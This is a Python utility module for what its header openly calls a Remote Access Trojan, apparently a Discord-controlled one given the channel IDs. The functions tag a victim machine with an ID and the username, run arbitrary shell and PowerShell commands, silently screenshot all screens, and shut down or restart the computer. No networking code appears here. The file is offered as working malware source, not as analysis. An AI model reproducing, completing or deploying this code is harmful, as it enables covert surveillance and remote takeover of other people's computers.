#-----------------------------------------------------------------------------------------------------------------------------------
# This is a RAT(Remote Access Trojaner)
# Author: Deltatoolbox aka TornLotus
# Contact: Discord: tornlotus
# Lizenz: MIT License
# Github: https://github.com/Deltatoolbox/not_learning_by_not_doing
#-----------------------------------------------------------------------------------------------------------------------------------
#normal import
import os
import random
import subprocess
import json
from PIL import ImageGrab
#create or read device id
def create_or_read_id_file():
    id_file_path = "ids.txt"
    if not os.path.exists(id_file_path):
        with open(id_file_path, "w") as file:
            random_id = random.randint(10000, 99999)
            file.write(str(random_id))
            return random_id
    else:
        with open(id_file_path, "r") as file:
            return int(file.read())
        
#check if the file is in the final folder
def check_location(folder):
    # location of file
    aktuelles_skript_pfad = os.path.abspath(__file__)
    # location off final folder
    ordner_pfad = os.path.abspath(folder)
    if os.path.dirname(aktuelles_skript_pfad) == ordner_pfad:
        print(f"check_location=true")
    else:
        print(f"check_location=false")
#get category name
def category_name():
    id = create_or_read_id_file()
    username = os.getlogin()
    category_name = f"{id}-{username}"
    return category_name
#execute cmd commands
def exe_cmd(cmd):
    return subprocess.check_output(cmd, shell=True).decode()
def save_ids(category_id, info_channel_id, main_channel_id, spam_channel_id):
    # get divce id
    device_id = create_or_read_id_file()
    #set config content
    config = {
        "device_id": device_id,
        "category_id": category_id,
        "info_channel_id": info_channel_id,
        "main_channel_id": main_channel_id,
        "spam_channel_id": spam_channel_id
    }
    #wirte conifg content to config_custom.json
    with open("config_custom.json", "w") as file:
        json.dump(config, file, indent=4)
#function to get ids("spam_channel_id","main_channel_id","info_channel_id","category_id","device_id")
def get_ids():
    with open("config_custom.json", "r") as file:
        config = json.load(file)
    return config
#function to get configs
def read_config():
    with open("config.json", "r") as file:
        return json.load(file)
#make screenshot
async def take_sc():
    # create sc
    ImageGrab.grab(all_screens=True).save(f'{os.getcwd()}/sc.png', 'png')
    


    
#shutdown and restart
def shutdown():
    try:
        subprocess.run(["powershell", "-Command", "Stop-Computer"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return
    except subprocess.SubprocessError as e:
        return f"error: {e}"
def restart():
    try:
        subprocess.run(["powershell", "-Command", "Restart-Computer"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return
    except subprocess.SubprocessError as e:
        return f"error: {e}"
#powershell command
def powershell(command):
    try:
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"error: {e}"
